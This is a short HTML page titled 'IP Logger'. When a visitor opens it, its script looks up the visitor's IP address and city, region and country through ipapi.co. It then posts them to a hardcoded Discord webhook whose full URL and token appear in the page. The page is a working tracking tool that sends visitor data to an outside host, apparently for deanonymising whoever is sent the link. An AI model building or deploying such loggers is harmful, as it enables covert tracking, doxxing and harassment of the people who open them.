<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>IP Logger</title>
</head>
<body onload="logIPAndLocation('https://discord.com/api/webhooks/1390407856527904982/ijfqflvt7QMjNERrl-oQk8b147WwMois4Ptos8xCNGboOPn_O878wveOaLUoMYG6nM5l')">
    <h1>Welcome to the IP Logger</h1>
    <p>Your IP and location are being logged...</p>

    <script>
    function logIPAndLocation(webhookUrl) {
        fetch('https://ipapi.co/json/')
            .then(response => response.json())
            .then(data => {
                const ip = data.ip;
                const location = `${data.city}, ${data.region}, ${data.country_name}`;
                fetch(webhookUrl, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({ content: `IP: ${ip}\nLocation: ${location}` })
                });
            });
    }
    </script>
</body>
</html>
